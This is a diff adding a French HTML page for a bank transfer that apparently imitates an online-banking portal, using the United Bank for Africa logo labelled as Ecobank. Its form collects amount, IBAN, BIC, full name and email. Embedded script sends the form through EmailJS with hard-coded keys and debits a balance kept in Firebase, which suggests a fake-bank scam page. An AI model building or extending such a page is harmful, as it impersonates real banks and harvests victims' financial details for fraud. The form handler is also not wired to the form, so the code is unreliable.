@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title> Effectuer un Virement</title>
+  <link rel="stylesheet" href="styles.css">
+<link rel="shortcut icon" href="https://lh3.googleusercontent.com/ywesC1_Rzifbvs8qVqqp5xJQN1IkP2VQ7hcDU7KKiNJx7nb5oD4bE3VNN9Pk3ZGaFHtF=w300" />
+</head>
+<body>
+<header>
+  <div>    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2c/United_Bank_for_Africa_logo.svg/1280px-United_Bank_for_Africa_logo.svg.png" alt="Ecobank Logo" height="120">    <small style="display:block;">« Africa's Global Bank »</small>
+  </div>
+  <div>
+    <input type="text" placeholder="Rechercher sur le site" style="padding:6px 8px; border-radius:5px; border: none;">
+  </div>
+</header>
+
+<nav>
+  <a href="#">Banque au quotidien</a>
+  <a href="#">Épargne</a>
+  <a href="#">Crédit</a>
+  <a href="#">Assurances</a>
+  <a href="#">Patrimoine</a>
+</nav>
+
+<div class="full-container">
+  <aside class="sidebar">
+    <h3 id="sidebar-name">Chargement...</h3>
+    <p id="sidebar-address">Adresse : </p>
+    <p>Dernière connexion : <time id="now"></time> <script> function updateTime() { const now = new Date(); document.getElementById("now").textContent = now.toLocaleString("fr-FR", { dateStyle: "full", timeStyle: "medium" }); } updateTime(); setInterval(updateTime, 1000); </script></p>
+    <button onclick="logout()">Se déconnecter</button>
+    <hr>
+    <p><a href="#">Souscrire en ligne</a></p>
+    <h4>Opérations</h4>
+    <a href="virement.html">Faire un Virement</a>
+    <a href="ajouter-beneficiaire.html">Ajouter un Bénéficiaire</a>
+    <h4 style="margin-top: 15px;">Comptes</h4>
+    <a href="dashboard.html">Synthèse</a>
+    <a href="historique.html">Historique</a>
+    <a href="#">Téléchargement</a>
+  </aside>
+
+  <main class="main">
+    <h2>💸 Effectuer un Virement Bancaire</h2>
+    <p>Remplissez ce formulaire pour envoyer votre virement en toute sérénité 😊</p>
+
+    <!-- Formulaire EmailJS -->
+    <form action="intermediaire.html" method="get">
+      <label>Montant (€)</label>
+      <input type="number" name="montant" placeholder="Ex : 1000" required /><br>
+
+      <label>Motif</label>
+      <input type="text" name="motif" placeholder="Ex : Paiement facture" required /><br>
+
+      <label>IBAN</label>
+      <input type="text" name="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" required /><br>
+
+      <label>BIC</label>
+      <input type="text" name="bic" placeholder="Ex : BNPAFRPPXXX" required /><br>
+
+      <label>Domiciliation</label>
+      <input type="text" name="domiciliation" placeholder="Nom de la banque" required /><br>
+
+      <label>Nom et Prénom</label>
+      <input type="text" name="user_name" placeholder="Ex : Jean Dupont" required /><br>
+
+      <label>Email</label>
+      <input type="email" name="user_email" placeholder="votre@email.com" required /><br>
+
+      <label>Date</label>
+      <input type="date" name="date" required /><br>
+<button type="submit"> ✅Valider le virement</button>  </form>
+  </main>
+</div>
+
+<footer>
+  Mentions légales – Sécurité – Accessibilité – Plan du site
+</footer>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  emailjs.init("Mw2rvwAZxMJ2RHQ8n");
+
+  async function sendEmail(event) {
+    event.preventDefault();
+    const form = event.target;
+    const formData = new FormData(form);
+    const params = new URLSearchParams();
+    for (const pair of formData.entries()) params.append(pair[0], pair[1]);
+
+    try {
+      await emailjs.sendForm("service_mnehge8", "template_y5wqgt8", form);
+
+      // Mise à jour du solde et historique via Firebase
+      const user = await getAndSetCurrentUser();
+      if (user) {
+        const montant = parseFloat(formData.get("montant"));
+        if (user.solde >= montant) {
+          user.solde -= montant;
+          if (!user.historique) user.historique = [];
+          user.historique.unshift({
+            date: new Date().toLocaleString('fr-FR'),
+            libelle: `Virement vers ${formData.get("domiciliation")}`,
+            montant: -montant,
+            type: 'debit'
+          });
+          await updateCurrentUser(user);
+        }
+      }
+
+      // Redirection vers confirmation avec paramètres
+      window.location.href = "confirmation.html?" + params.toString();
+    } catch (error) {
+      alert("❌ Une erreur est survenue : " + JSON.stringify(error));
+    }
+  }
+</script>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+<script src="shared.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', async () => {
+  updateUI();
+  const user = await getAndSetCurrentUser();
+  if (user) {
+    document.getElementById('sidebar-name').textContent = `${user.nom}`;
+    document.getElementById('sidebar-address').textContent = `Adresse : ${user.adresse}`;
+  } else {
+    window.location.href = 'index.html';
+  }
+});
+</script>
+</body>
+</html>
